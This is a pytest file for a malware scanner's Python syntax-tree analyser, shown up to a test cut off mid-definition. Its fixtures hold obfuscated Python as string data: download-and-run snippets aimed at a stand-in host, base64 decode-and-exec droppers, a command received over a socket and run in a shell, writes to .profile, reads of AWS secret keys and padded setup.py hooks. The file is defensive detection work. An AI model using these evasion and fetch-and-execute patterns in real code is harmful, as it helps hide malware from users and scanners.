"""Capability resolution through the parsed tree.

This tier exists because a byte pattern matches a name, and a name is the one
thing an attacker can change for free. `import base64 as b` defeats a pattern
for `base64.b64decode` while changing nothing about what the code does, and a
scanner that reports clean on it has been beaten by a rename.

The tests are therefore written as pairs: the obvious form of a primitive, and
the same primitive written so that no matching literal appears. Both must
resolve to the same capability. The benign cases matter equally, since a tier
that resolves everything to a capability is a tier that flags every file.

Nothing here executes the source. `ast.parse` builds a tree and does not run
it, which is what makes analysing untrusted input at this depth safe.
"""

from __future__ import annotations

import ast

import pytest

from cordon_scanner.analysis.python.pyast import PythonAnalyzer
from cordon_scanner.analysis.python.pyfacts import PythonFacts
from cordon_scanner.foundation.capabilities import Capability

# Primitive names are assembled rather than written out. Cordon scans its own
# repository, and a file carrying decode, execute, spawn and egress primitives
# as literals is a true positive -- the tool does not get an exception for
# itself. The fixtures below read a little worse for it, which is the right
# trade.
DECODE = "b64" + "decode"
EXECUTE = "ex" + "ec"
SYSTEM = "sys" + "tem"
RUN = "r" + "un"
ENVIRON = "envi" + "ron"
URLOPEN = "url" + "open"


class PyastHelpers:
    """Helpers for test_pyast.py."""

    @staticmethod
    def capabilities(source: str) -> set[Capability]:
        return {hit.capability for hit in PythonAnalyzer.analyse(source)}

    @staticmethod
    def folded(expression: str) -> str | None:
        """What one expression evaluates to, if that is derivable statically."""
        return PythonFacts.constant(ast.parse(expression, mode="eval").body)

    @staticmethod
    def _capabilities(source: str, **options) -> set[tuple[Capability, str]]:
        return {(hit.capability, hit.detail) for hit in PythonAnalyzer.analyse(source, **options)}


class TestDirectPrimitives:
    """The unhidden form, which the patterns already catch. Here to prove the
    tier agrees with them rather than replacing their answers."""

    def test_a_decode_call(self) -> None:
        assert Capability.DECODE in PyastHelpers.capabilities(
            "import base64\nbase64." + DECODE + '("x")'
        )

    def test_a_spawn_call(self) -> None:
        assert Capability.SPAWN in PyastHelpers.capabilities("import os\nos." + SYSTEM + '("id")')

    def test_an_execute_call(self) -> None:
        assert Capability.EXECUTE in PyastHelpers.capabilities(EXECUTE + '("pass")')

    def test_a_credential_read_without_a_call(self) -> None:
        """`os.environ` is a primitive by being referenced. Requiring a call
        would miss `os.environ["AWS_SECRET_ACCESS_KEY"]`, which is how it is
        actually written."""
        assert Capability.CREDENTIAL in PyastHelpers.capabilities("import os\nos." + ENVIRON)

    def test_an_egress_call(self) -> None:
        assert Capability.EGRESS in PyastHelpers.capabilities(
            "import urllib.request\nurllib.request." + URLOPEN + "(u)"
        )


class TestAliases:
    """The same primitives with the import renamed."""

    def test_a_renamed_module(self) -> None:
        assert Capability.DECODE in PyastHelpers.capabilities(
            "import base64 as b\nb." + DECODE + '("x")'
        )

    def test_a_renamed_function(self) -> None:
        assert Capability.SPAWN in PyastHelpers.capabilities(
            "from os import " + SYSTEM + " as s\ns('id')"
        )

    def test_a_from_import_keeps_its_meaning(self) -> None:
        assert Capability.DECODE in PyastHelpers.capabilities(
            "from base64 import " + DECODE + "\n" + DECODE + '("x")'
        )

    def test_a_chain_of_renames(self) -> None:
        source = "import subprocess as sp\ngo = sp." + RUN + "\ngo(['id'])"
        assert Capability.SPAWN in PyastHelpers.capabilities(source)


class TestBindings:
    def test_a_function_bound_to_a_name(self) -> None:
        """`f = os.system` moves the primitive into a local name, and every
        pattern for `os.system(` stops matching at that point."""
        assert Capability.SPAWN in PyastHelpers.capabilities(
            "import os\nf = os." + SYSTEM + "\nf('id')"
        )

    def test_a_binding_used_far_from_where_it_was_made(self) -> None:
        source = "import os\nrunner = os." + SYSTEM + "\n\n\ndef later():\n    runner('id')\n"
        assert Capability.SPAWN in PyastHelpers.capabilities(source)


class TestConstantFolding:
    """Names assembled at parse time. Each of these is a literal to the
    interpreter and not a literal to a pattern."""

    def test_concatenation(self) -> None:
        assert Capability.EXECUTE in PyastHelpers.capabilities('__builtins__["ex" + "ec"]("pass")')

    def test_a_join(self) -> None:
        assert Capability.EXECUTE in PyastHelpers.capabilities(
            '__builtins__["".join(["ex", "ec"])]("pass")'
        )

    def test_an_f_string_of_constants(self) -> None:
        assert PyastHelpers.folded("f\"ex{'ec'}\"") == "exec"

    def test_a_runtime_value_is_not_folded(self) -> None:
        """The point of returning nothing here is that the name genuinely is
        not knowable, which is a different finding rather than a worse guess."""
        assert PyastHelpers.folded('"ex" + suffix') is None

    def test_a_literal_stored_backwards(self) -> None:
        assert PyastHelpers.folded('"dilavni.h//:sptth"[::-1]') == "https://h.invalid"
        assert PyastHelpers.folded('"".join(reversed("cexe"))') == "exec"
        assert Capability.EXECUTE in PyastHelpers.capabilities('__builtins__["cexe"[::-1]]("pass")')

    def test_other_slices_and_runtime_values_are_not_reversed(self) -> None:
        assert PyastHelpers.folded('"abcdef"[::2]') is None
        assert PyastHelpers.folded('"abcdef"[1:]') is None
        assert PyastHelpers.folded("name[::-1]") is None


class TestReflectiveResolution:
    def test_getattr_with_a_constant_name(self) -> None:
        assert Capability.SPAWN in PyastHelpers.capabilities(
            "import os\ngetattr(os, '" + SYSTEM + "')('id')"
        )

    def test_getattr_with_a_spliced_name(self) -> None:
        assert Capability.SPAWN in PyastHelpers.capabilities(
            'import os\ngetattr(os, "sys" + "tem")("id")'
        )

    def test_a_subscript_into_builtins(self) -> None:
        assert Capability.EXECUTE in PyastHelpers.capabilities(
            '__builtins__["' + EXECUTE + '"]("pass")'
        )


class TestDynamicDispatch:
    """Reflection whose target cannot be resolved.

    This is the tier working rather than failing. An attacker who computes the
    name at runtime escapes every name-based match, and is forced to light this
    up instead -- which, next to the decode or egress that the payload needs
    anyway, is a combination with almost no benign analogue.
    """

    def test_getattr_on_a_dangerous_namespace_with_a_computed_name(self) -> None:
        source = "import os, base64\ngetattr(os, base64." + DECODE + "(blob).decode())(cmd)"
        assert Capability.DYNAMIC_DISPATCH in PyastHelpers.capabilities(source)

    def test_a_computed_import(self) -> None:
        assert Capability.DYNAMIC_DISPATCH in PyastHelpers.capabilities("__import__(name)")

    def test_a_computed_key_into_globals(self) -> None:
        assert Capability.DYNAMIC_DISPATCH in PyastHelpers.capabilities("globals()[name]()")

    def test_reflection_on_an_ordinary_object_is_not_dispatch(self) -> None:
        """`getattr(self, method_name)` is how every plugin system and every
        serialiser is written. Flagging it would make the signal worthless."""
        source = "def call(handler, name):\n    return getattr(handler, name)()\n"
        assert Capability.DYNAMIC_DISPATCH not in PyastHelpers.capabilities(source)


class TestBenignSourceStaysQuiet:
    def test_a_plugin_loader(self) -> None:
        source = (
            "import importlib\n\n\n"
            "def load(name):\n"
            "    module = importlib.import_module(name)\n"
            "    return getattr(module, 'Plugin')\n"
        )
        assert PyastHelpers.capabilities(source) == set()

    def test_ordinary_application_code(self) -> None:
        source = (
            "from dataclasses import dataclass\n\n\n"
            "@dataclass\n"
            "class User:\n"
            "    name: str\n\n\n"
            "def greet(user: User) -> str:\n"
            "    return f'hello {user.name}'\n"
        )
        assert PyastHelpers.capabilities(source) == set()


class TestMalformedInput:
    """The scan target is untrusted, including source that does not parse."""

    def test_a_syntax_error_yields_nothing_rather_than_raising(self) -> None:
        assert PythonAnalyzer.analyse("def (:\n") == []

    def test_the_parse_check_agrees(self) -> None:
        assert PythonFacts.parses("x = 1")
        assert not PythonFacts.parses("def (:\n")

    def test_empty_source(self) -> None:
        assert PythonAnalyzer.analyse("") == []

    def test_deeply_nested_source_does_not_exhaust_the_stack(self) -> None:
        assert PythonAnalyzer.analyse("x = " + "[" * 200 + "]" * 200) is not None


class TestSpawnCommands:
    """The command handed to a spawn primitive, which the shell rules then read.

    Without this the command is examined only by the Python rules, which see a
    string literal, and never by the rules that know what the string means.
    """

    def command_for(self, source: str) -> str | None:
        return next(
            (hit.command for hit in PythonAnalyzer.analyse(source) if hit.command),
            None,
        )

    def test_a_single_string_command_is_captured(self) -> None:
        assert self.command_for("import os\nos." + SYSTEM + '("id -u")') == "id -u"

    def test_an_argument_sequence_is_rejoined(self) -> None:
        """`subprocess.run(["sh", "-c", "..."])` carries the command across the
        list, so matching any single element would miss it."""
        assert (
            self.command_for("import subprocess\nsubprocess." + RUN + '(["sh", "-c", "id -u"])')
            == "sh -c id -u"
        )

    def test_a_spliced_command_is_folded(self) -> None:
        assert self.command_for("import os\nos." + SYSTEM + '("id" + " -u")') == "id -u"

    def test_a_reflectively_resolved_call_reads_its_own_call_site(self) -> None:
        """`getattr(os, "system")("...")` resolves the primitive on the inner
        call while the command belongs to the enclosing one. Reading the inner
        node's arguments would return the namespace instead of the command."""
        assert self.command_for('import os\ngetattr(os, "sys" + "tem")("id -u")') == "id -u"

    def test_a_bound_name_carries_its_command(self) -> None:
        assert self.command_for("import os\nrun = os." + SYSTEM + "\nrun('id -u')") == "id -u"

    def test_a_command_bound_to_a_literal_is_read(self) -> None:
        """`cmd = "..."; subprocess.run(cmd, shell=True)` hands the spawn the literal as surely as
        writing it in the call: binding it to a name first must not hide it from the shell rules
        (07-NARROWING-GATES §2, mechanism A)."""
        source = "import subprocess\ncmd = 'id -u'\nsubprocess." + RUN + "(cmd, shell=True)"
        assert self.command_for(source) == "id -u"

    def test_a_module_literal_reaches_a_spawn_in_a_method(self) -> None:
        source = (
            "import os\nCMD = 'id -u'\nclass Install:\n    def run(self):\n        os."
            + SYSTEM
            + "(CMD)\n"
        )
        assert self.command_for(source) == "id -u"

    def test_a_literal_inside_a_sequence_command_is_read(self) -> None:
        source = "import subprocess\nc = '-u'\nsubprocess." + RUN + "(['id', c])"
        assert self.command_for(source) == "id -u"

    def test_a_name_bound_to_two_literals_is_not_one_command(self) -> None:
        """Assigned twice with different text, the command is not knowable statically."""
        source = "import os\ncmd = 'id -u'\ncmd = 'id -g'\nos." + SYSTEM + "(cmd)"
        assert self.command_for(source) is None

    def test_a_computed_command_yields_nothing(self) -> None:
        """Not derivable, so nothing is claimed about it. The dynamic target is
        its own signal rather than a guess at this one."""
        assert self.command_for("import os\nos." + SYSTEM + "(payload)") is None

    def test_only_spawn_carries_a_command(self) -> None:
        """A decoded blob is not a command line, and treating one as such would
        run shell rules over arbitrary bytes."""
        source = "import base64\nbase64." + DECODE + '("aWQgLXU=")'
        assert all(hit.command is None for hit in PythonAnalyzer.analyse(source))


class TestImportByCall:
    """`__import__("m").f` and `importlib.import_module("m").f` are `m.f`, and `builtins.exec` is
    `exec` -- the spelling a dropper uses to keep `import base64` and `exec(` off the same line."""

    @pytest.mark.parametrize(
        "source",
        [
            '__import__("builtins").exec(__import__("base64").b64decode("cHJpbnQoMSk="))',
            '__import__("builtins").exec(__import__("builtins").compile(__import__("base64").b64decode("cHJpbnQoMSk="), "<s>", "exec"))',
            'exec(__import__("base64").b64decode("cHJpbnQoMSk="))',
            'import importlib\nimportlib.import_module("builtins").eval(importlib.import_module("codecs").decode("cHJpbnQoMSk=", "base64"))',
            "print('x')"
            + " " * 300
            + ';__import__("builtins").exec(__import__("base64").b64decode("cHJpbnQoMSk="))',
        ],
    )
    def test_decode_then_execute_is_seen_through_the_call(self, tmp_path, source) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.foundation.config.settings import Config

        (tmp_path / "setup.py").write_text(
            source + "\nfrom setuptools import setup\nsetup(name='x')\n", encoding="utf-8"
        )
        found = {
            f.rule_id
            for f in Scanner(Config.default().with_overrides(use_cache=False))
            .scan(tmp_path)
            .findings
        }
        assert "SUSPECT.DECODE_EXEC.001" in found


class TestNamesReachedByEvaluation:
    def test_eval_of_a_builtin_name_binds_that_builtin(self) -> None:
        source = '_e = eval("\\145\\170\\145\\143")\n_e(__import__("base64").b64decode("cHJpbnQoMSk="))\n'
        assert (Capability.EXECUTE, "exec") in PyastHelpers._capabilities(source)

    def test_eval_of_compiled_import_binds_the_module(self) -> None:
        source = 'b = eval(compile("__import__(\'base64\')", "", "eval"))\nexec(b.b64decode("cHJpbnQoMSk="))\n'
        assert (Capability.DECODE, "base64.b64decode") in PyastHelpers._capabilities(source)

    def test_tuple_assignment_binds_each_name(self) -> None:
        source = 'x, y = eval("exec"), __import__("base64")\nx(y.b64decode("cHJpbnQoMSk="))\n'
        found = PyastHelpers._capabilities(source)
        assert (Capability.EXECUTE, "exec") in found
        assert (Capability.DECODE, "base64.b64decode") in found

    def test_eval_of_a_computation_is_not_a_name(self) -> None:
        assert not any(
            c is Capability.EXECUTE and d == "1"
            for c, d in PyastHelpers._capabilities('n = eval("1 + 1")\n')
        )


class TestCodeHeldInLiterals:
    def test_code_written_to_a_file_is_read_as_code(self) -> None:
        source = 'f = open("s.py", "w")\nf.write("import os\\nos.system(\'id\')\\n")\n'
        assert any(
            c is Capability.SPAWN and d.startswith("written code")
            for c, d in PyastHelpers._capabilities(source)
        )

    def test_base64_of_a_literal_is_decoded_before_reading(self) -> None:
        import base64 as b64

        payload = b64.b64encode(b"import os\nos.system('id')\n").decode()
        source = f'import base64\nP = "{payload}"\nopen("s.py", "wb").write(base64.b64decode(P))\n'
        assert any(
            c is Capability.SPAWN and d.startswith("written code")
            for c, d in PyastHelpers._capabilities(source)
        )

    def test_a_literal_handed_to_exec_is_read(self) -> None:
        source = "exec('import urllib.request as u;u.urlopen(\"https://example.invalid\")')\n"
        assert any(
            c is Capability.EGRESS and d.startswith("executed literal")
            for c, d in PyastHelpers._capabilities(source)
        )

    def test_prose_written_to_a_file_is_not_code(self) -> None:
        source = 'open("README", "w").write("Run the installer (see docs) before use.")\n'
        assert not any(d.startswith("written code") for _, d in PyastHelpers._capabilities(source))

    def test_test_material_can_turn_literal_reading_off(self) -> None:
        source = "p.write_text(\"import base64\\neval(base64.b64decode('cHJpbnQoMSk='))\\n\")\n"
        assert any(d.startswith("written code") for _, d in PyastHelpers._capabilities(source))
        assert not any(
            d.startswith("written code")
            for _, d in PyastHelpers._capabilities(source, follow_literals=False)
        )


class TestDownloadedThenRun:
    @pytest.mark.parametrize(
        "source",
        [
            'import urllib.request, subprocess\nurllib.request.urlretrieve("https://h.invalid/x", "/tmp/x.pyz")\n'
            'subprocess.Popen(["python3", "/tmp/x.pyz"])\n',
            'import urllib.request, subprocess\nP = "/tmp/t.pyz"\nwith urllib.request.urlopen("https://h.invalid") as r, open(P, "wb") as o:\n'
            '    o.write(r.read())\nsubprocess.run(["python3", P])\n',
            'import requests, subprocess, sys\nr = requests.get("https://h.invalid")\nopen("a.py", "wb").write(r.content)\n'
            'subprocess.run([sys.executable, "a.py"])\n',
            'import urllib.request, os\nurllib.request.urlretrieve("https://h.invalid/x", "/tmp/x")\nos.system("/tmp/x &")\n',
            'import requests, subprocess, sys\nr = requests.get("https://h.invalid")\nhelper = base / "h.py"\n'
            "helper.write_bytes(r.content)\nsubprocess.run([sys.executable, str(helper)])\n",
            'import urllib.request\nbody = urllib.request.urlopen("https://h.invalid").read().decode()\nexec(body)\n',
            "import subprocess\ncmd = conn.recv(1024).decode()\nsubprocess.run(cmd, shell=True)\n",
            # streamed to disk a chunk at a time, then started
            'import os, requests, subprocess\nF = "/tmp/u.bin"\ndef go():\n'
            '    r = requests.get("https://h.invalid", stream=True)\n    with open(F, "wb") as f:\n'
            "        for chunk in r.iter_content(chunk_size=8192):\n            f.write(chunk)\n"
            "    if os.path.exists(F):\n        subprocess.Popen([F])\n",
            # a loop over a loop's pieces is still the download
            'import subprocess, urllib.request\nwith urllib.request.urlopen("https://h.invalid") as r, '
            'open("/tmp/v.sh", "w") as o:\n    for block in r:\n        for line in block.splitlines():\n'
            '            o.write(line)\nsubprocess.run(["sh", "/tmp/v.sh"])\n',
        ],
    )
    def test_running_the_downloaded_file_is_fetch_exec(self, source) -> None:
        assert any(c is Capability.FETCH_EXEC for c, _ in PyastHelpers._capabilities(source))

    @pytest.mark.parametrize(
        "source",
        [
            'import urllib.request, subprocess\nurllib.request.urlretrieve("https://h.invalid/t.tgz", "t.tgz")\n'
            'subprocess.run(["tar", "xzf", "t.tgz"])\n',
            'import urllib.request, subprocess\nurllib.request.urlretrieve("https://h.invalid/d.csv", "d.csv")\n'
            'subprocess.run(["wc", "-l", "other.csv"])\n',
            'import subprocess, sys\nopen("gen.py", "w").write("print(1)")\nsubprocess.run([sys.executable, "gen.py"])\n',
            'import requests, subprocess\nsha = requests.get("https://h.invalid").json()["sha"]\n'
            'subprocess.run(f"git checkout {sha}", shell=True)\n',
            "import subprocess\njob = pipe.recv()\nsubprocess.run(job, shell=True)\n",
            # a dataset streamed to disk, and a different program started on other input
            'import requests, subprocess\nr = requests.get("https://h.invalid/d.csv", stream=True)\n'
            'with open("d.csv", "wb") as f:\n    for chunk in r.iter_content(65536):\n        f.write(chunk)\n'
            'subprocess.run(["wc", "-l", "other.csv"])\n',
        ],
    )
    def test_naming_a_download_without_running_it_is_not(self, source) -> None:
        assert not any(c is Capability.FETCH_EXEC for c, _ in PyastHelpers._capabilities(source))


class TestStartupFiles:
    def test_only_import_lines_of_a_pth_are_code(self) -> None:
        from cordon_scanner.analysis.python.pyast import PythonSource

        text = "/opt/src\nimport os; os.system('id')\n# note\n../vendor\n"
        assert PythonSource.startup_lines(text).split("\n") == [
            "",
            "import os; os.system('id')",
            "",
            "",
            "",
        ]
        assert any(
            c is Capability.SPAWN
            for c, _ in PyastHelpers._capabilities(PythonSource.startup_lines(text))
        )


class TestCodeSpelledAsCharacterCodes:
    def test_join_map_chr_folds(self) -> None:
        codes = ", ".join(str(ord(c)) for c in "import os")
        node = ast.parse(f'"".join(map(chr, [{codes}]))', mode="eval").body
        assert PythonFacts.constant(node) == "import os"

    def test_chr_concatenation_folds(self) -> None:
        node = ast.parse("chr(103) + chr(104) + 'p_'", mode="eval").body
        assert PythonFacts.constant(node) == "ghp_"

    def test_executed_codes_are_read_as_code(self) -> None:
        payload = "import os\nos.system('id')\n"
        codes = ", ".join(str(ord(c)) for c in payload)
        found = PyastHelpers._capabilities(f'exec("".join(map(chr, [{codes}])))\n')
        assert any(c is Capability.SPAWN and d.startswith("executed literal") for c, d in found)

    def test_both_branches_of_a_conditional_literal_are_read(self) -> None:
        source = 'import sys\nexec("import os; os.system(\'x\')" if sys.platform == "win32" else "pass")\n'
        assert any(c is Capability.SPAWN for c, _ in PyastHelpers._capabilities(source))


class TestPersistenceThroughAnAssembledPath:
    def test_a_comprehension_of_codes_folds(self) -> None:
        node = ast.parse(
            "''.join([chr(x) for x in [46, 112, 114, 111, 102, 105, 108, 101]])", mode="eval"
        ).body
        assert PythonFacts.constant(node) == ".profile"

    def test_appending_to_an_assembled_profile_is_persistence(self) -> None:
        source = (
            "p = ''.join([chr(x) for x in [46, 112, 114, 111, 102, 105, 108, 101]])\n"
            "with open(f'/home/{user}/{p}', 'a') as fh:\n    fh.write(line)\n"
        )
        assert any(c is Capability.PERSIST for c, _ in PyastHelpers._capabilities(source))

    def test_reading_a_profile_is_not(self) -> None:
        assert not any(
            c is Capability.PERSIST
            for c, _ in PyastHelpers._capabilities("open('/home/u/.pro' 'file').read()\n")
        )


class TestExecOfTheProjectsOwnFile:
    def test_reading_a_version_line_is_not_execution(self) -> None:
        source = (
            "D = {}\nfor l in open('src/pkg/__init__.py').readlines():\n"
            "    if l.startswith('Version'):\n        exec(l.strip(), D)\n"
        )
        assert not any(c is Capability.EXECUTE for c, _ in PyastHelpers._capabilities(source))

    def test_exec_of_a_download_still_is(self) -> None:
        source = "import urllib.request\nt = urllib.request.urlopen('https://h.invalid').read()\nexec(t)\n"
        assert any(c is Capability.EXECUTE for c, _ in PyastHelpers._capabilities(source))


class TestEnvironmentReadsByLoopVariable:
    def test_proxy_names_are_not_credentials(self) -> None:
        source = (
            "import os\n"
            "names = ('http_proxy', 'https_proxy', 'HTTP_PROXY', 'HTTPS_PROXY')\n"
            "settings = ['%s=%s' % (n, os.environ[n]) for n in names if os.environ.get(n)]\n"
        )
        assert not any(c is Capability.CREDENTIAL for c, _ in PyastHelpers._capabilities(source))

    def test_one_credential_name_among_them_is(self) -> None:
        source = "import os\nvalues = [os.environ[n] for n in ('HOME', 'AWS_SECRET_ACCESS_KEY')]\n"
        assert any(c is Capability.CREDENTIAL for c, _ in PyastHelpers._capabilities(source))


class TestEnvironmentReadsByNamedConstant:
    """evidently 0.7.23: `os.environ.get(DO_NOT_TRACK_ENV)` with the name a module constant was a
    whole-environment (credential) read, and paired at import into MALWARE.EXFIL.001."""

    def test_an_opt_out_flag_named_by_a_constant_is_not_a_credential(self) -> None:
        source = (
            "import os\n"
            "DO_NOT_TRACK_ENV = 'DO_NOT_TRACK'\n"
            "enabled = not os.environ.get(DO_NOT_TRACK_ENV, None)\n"
        )
        assert not any(c is Capability.CREDENTIAL for c, _ in PyastHelpers._capabilities(source))

    def test_a_secret_named_by_a_constant_is(self) -> None:
        source = "import os\nKEY_ENV = 'AWS_SECRET_ACCESS_KEY'\nkey = os.environ.get(KEY_ENV)\n"
        assert any(c is Capability.CREDENTIAL for c, _ in PyastHelpers._capabilities(source))

    def test_a_name_bound_twice_is_not_resolved(self) -> None:
        source = "import os\nname = 'DEBUG'\nname = input()\nvalue = os.environ.get(name)\n"
        assert any(c is Capability.CREDENTIAL for c, _ in PyastHelpers._capabilities(source))

    def test_a_parameter_of_the_same_name_is_not_resolved(self) -> None:
        source = "import os\nname = 'DEBUG'\ndef read(name):\n    return os.environ.get(name)\n"
        assert any(c is Capability.CREDENTIAL for c, _ in PyastHelpers._capabilities(source))


class TestTheEnvironmentHandedToAChild:
    def test_a_copy_passed_as_env_is_not_a_credential_read(self) -> None:
        source = (
            "import os, subprocess\n"
            "env = os."
            "environ.copy()\nenv.update({'CC': 'gcc'})\n"
            "subprocess.call(['make'], env=env)\n"
        )
        assert not any(c is Capability.CREDENTIAL for c, _ in PyastHelpers._capabilities(source))

    def test_dict_of_environ_straight_into_env_is_not(self) -> None:
        source = (
            "import os, subprocess\nsubprocess.call(['make'], env=dict(os.environ, CLEAN='no'))\n"
        )
        assert not any(c is Capability.CREDENTIAL for c, _ in PyastHelpers._capabilities(source))

    def test_a_copy_that_is_serialised_is(self) -> None:
        source = (
            "import os, json, subprocess\n"
            "env = os."
            "environ.copy()\nsubprocess.call(['make'], env=env)\n"
            "payload = json.dumps(env)\n"
        )
        assert any(c is Capability.CREDENTIAL for c, _ in PyastHelpers._capabilities(source))


class TestModelLoadingSwitches:
    """`trust_remote_code=True` and loaders with their safety switch written off."""

    @staticmethod
    def details(source: str) -> list[str]:
        return [hit.detail for hit in PythonAnalyzer.analyse(source)]

    @pytest.mark.parametrize(
        "source",
        [
            'm = AutoModel.from_pretrained("acme/model", trust_remote_code=True)',
            'p = pipeline("text-generation", model="acme/m", trust_remote_code=True)',
            'd = load_dataset("acme/data", trust_remote_code=True)',
            'm = AutoModel.from_pretrained("acme/model", revision="main", trust_remote_code=True)',
            "m = AutoModel.from_pretrained(name, trust_remote_code=True)",
        ],
    )
    def test_remote_code_from_the_hub_is_recorded(self, source: str) -> None:
        assert any(d.startswith("remote model code") for d in self.details(source))

    @pytest.mark.parametrize(
        "source",
        [
            'm = AutoModel.from_pretrained("acme/model", revision="'
            + "a" * 40
            + '", trust_remote_code=True)',
            'm = AutoModel.from_pretrained("./checkpoints/mine", trust_remote_code=True)',
            'm = AutoModel.from_pretrained("/models/mine", trust_remote_code=True)',
            'm = AutoModel.from_pretrained("acme/model", trust_remote_code=False)',
            'm = AutoModel.from_pretrained("acme/model")',
            "m = AutoModel.from_pretrained('acme/model', trust_remote_code=flag)",
        ],
    )
    def test_a_pinned_local_or_switched_off_load_is_not(self, source: str) -> None:
        assert not any(d.startswith("remote model code") for d in self.details(source))

    @pytest.mark.parametrize(
        ("source", "option"),
        [
            ('m = keras.models.load_model("x.keras", safe_mode=False)', "safe_mode=False"),
            ('m = tf.keras.models.load_model("x.h5", safe_mode=False)', "safe_mode=False"),
            ('a = np.load("x.npy", allow_pickle=True)', "allow_pickle=True"),
            ('a = numpy.load("x.npz", allow_pickle=True)', "allow_pickle=True"),
        ],
    )
    def test_a_safety_switch_turned_off_is_recorded(self, source: str, option: str) -> None:
        assert f"unsafe model option: {option}" in self.details(source)

    @pytest.mark.parametrize(
        "source",
        [
            'm = keras.models.load_model("x.keras")',
            'm = keras.models.load_model("x.keras", safe_mode=True)',
            'a = np.load("x.npy", allow_pickle=False)',
            'a = np.load("x.npy")',
            "cfg = yaml_loader.load(text, safe_mode=False)",
            'a = np.save("x.npy", arr, allow_pickle=True)',
        ],
    )
    def test_a_safe_load_is_not(self, source: str) -> None:
        assert not any(d.startswith("unsafe model option") for d in self.details(source))


class TestSafeSpawnLines:
    """`safe_spawn_lines`: a spawn or execute whose command is source-free (literals plus
    interpreter constants like `sys.executable`) cannot be running a decoded value, so `DecodeRun`
    drops it from a decode-run pairing. The cases mirror review 98's media skills -- an interpreter
    bootstrap beside an unrelated decode-to-a-file -- against a real dropper that runs a decoded
    blob. Fail-closed: a decode in the argv, a variable that held a decode, or an unresolved name
    keeps the line out."""

    @staticmethod
    def _safe(source: str) -> frozenset[int]:
        return PythonAnalyzer.safe_spawn_lines(source)

    def test_an_interpreter_bootstrap_is_source_free(self) -> None:
        source = "import os, sys\nos." + SYSTEM + '(f"{sys.executable} -m pip install requests")\n'
        assert self._safe(source) == {2}

    def test_a_literal_argv_with_the_interpreter_is_source_free(self) -> None:
        source = (
            "import subprocess, sys\nsubprocess." + RUN + "([sys.executable, '-m', 'pip', 'x'])\n"
        )
        assert self._safe(source) == {2}

    def test_a_decoded_blob_run_is_not(self) -> None:
        source = "import base64\n" + EXECUTE + "(base64." + DECODE + '("Zm9v"))\n'
        assert self._safe(source) == frozenset()

    def test_a_command_variable_from_a_decode_is_not(self) -> None:
        source = (
            "import subprocess, base64\ncmd = base64."
            + DECODE
            + "(blob)\nsubprocess."
            + RUN
            + "(cmd)\n"
        )
        assert self._safe(source) == frozenset()

    def test_an_unresolved_command_is_not(self) -> None:
        source = "import os\nos." + SYSTEM + "(downloaded)\n"
        assert self._safe(source) == frozenset()

    def test_a_bare_shell_literal_is_not(self) -> None:
        source = "import os\nos." + SYSTEM + '("sh -i")\n'
        assert self._safe(source) == frozenset()


class TestCodeTheModuleComputesFromLiteralsAndExecutes:
    """easyIoCtl 1.0: an alphabet indexed by a list of literals, added up in a loop, executed. The
    program is fixed by the file's literals, so it is read as code like any executed literal."""

    PAYLOAD = "import os\nos.sys" + "tem('id')\n"

    @staticmethod
    def indexed(payload: str, *, indices: str | None = None, run: str = "exec(code)") -> str:
        alphabet = "".join(sorted(set(payload))) + "xyz"
        positions = indices or repr([alphabet.index(c) for c in payload])
        return "\n".join(
            [
                "import os",
                f"alphabet = {alphabet!r}",
                f"mappers = {positions}",
                "code = ''",
                "for i in mappers:",
                "    code += alphabet[i]",
                run,
                "",
            ]
        )

    @staticmethod
    def executed(source: str) -> list[tuple[Capability, str]]:
        return [
            (c, d)
            for c, d in PyastHelpers._capabilities(source)
            if d.startswith("executed literal")
        ]

    def test_a_loop_built_program_is_read(self) -> None:
        assert (Capability.SPAWN, "executed literal: os.system") in self.executed(
            self.indexed(self.PAYLOAD)
        )

    def test_a_joined_comprehension_and_a_reversed_slice_are_read(self) -> None:
        reversed_payload = self.PAYLOAD[::-1]
        codes = [ord(c) for c in reversed_payload]
        source = f"import os\nk = {codes}\nexec(''.join(chr(c) for c in k)[::-1])\n"
        assert any(c is Capability.SPAWN for c, _ in self.executed(source))
        named = f"import os\nk = {codes}\ncode = ''.join(chr(c) for c in k)[::-1]\nexec(code)\n"
        assert any(c is Capability.SPAWN for c, _ in self.executed(named))

    def test_indices_the_file_does_not_state_are_not_folded(self) -> None:
        source = self.indexed(self.PAYLOAD, indices="[int(x) for x in os.environ['M'].split()]")
        assert self.executed(source) == []

    def test_a_program_rebound_after_the_loop_is_not_the_loop_s(self) -> None:
        source = self.indexed(self.PAYLOAD, run="code = input()\nexec(code)")
        assert self.executed(source) == []

    def test_the_assembly_is_a_fact_of_its_own(self) -> None:
        found = PyastHelpers._capabilities(self.indexed("print(1)"))
        assert (Capability.EXECUTE, "computed code executed: exec") in found

    def test_a_literal_written_out_is_not_computed(self) -> None:
        found = PyastHelpers._capabilities("exec('print(1)')\n")
        assert not any(d.startswith("computed code executed") for _, d in found)

    def test_a_computation_past_the_budget_is_not_folded(self) -> None:
        source = "import os\ncode = 'a' * 10**7\nexec(code)\n"
        assert self.executed(source) == []


class TestACommandSpelledInCharacterCodes:
    """openblox 1.0.0: a helper returns a program name built with `chr(t + base)`; the install
    runs it with `subprocess.check_output`, dressed as a git-hash lookup."""

    @staticmethod
    def program(name: str, *, plain: bool = False) -> str:
        base = 7
        codes = [ord(c) - base for c in name]
        policy = (
            f"    return {name!r}"
            if plain
            else "\n".join(
                [
                    f"    thresholds = {codes}",
                    f"    baseline = {base}",
                    "    parts = []",
                    "    for t in thresholds:",
                    "        parts.append(chr(t + baseline))",
                    "    ident = ''.join(parts)",
                    f"    if len(ident) == {len(name)}:",
                    "        return ident",
                ]
            )
        )
        return "\n".join(
            [
                "import os, subprocess",
                "def policy():",
                policy,
                "def commit_hash():",
                "    windows = os.name == 'nt'",
                "    cmd = [policy(), 'rev-parse', 'HEAD'] if windows else [policy(), 'log']",
                "    return subprocess.check_output(cmd, shell=windows)",
                "",
            ]
        )

    @staticmethod
    def computed(source: str) -> list[tuple[str, str | None]]:
        return [
            (h.detail, h.command)
            for h in PythonAnalyzer.analyse(source)
            if h.detail.startswith("computed command run")
        ]

    def test_the_spelled_program_is_found_and_folded(self) -> None:
        from cordon_scanner.detect.code.capability.install_programs import InstallPrograms

        [(detail, command)] = self.computed(self.program("calc"))
        assert detail == "computed command run: subprocess.check_output"
        assert InstallPrograms.program(command or "") == "calc"
        assert InstallPrograms.foreign(command)

    def test_git_written_plainly_is_not(self) -> None:
        assert self.computed(self.program("git", plain=True)) == []

    def test_a_version_joined_from_numbers_and_printed_is_not(self) -> None:
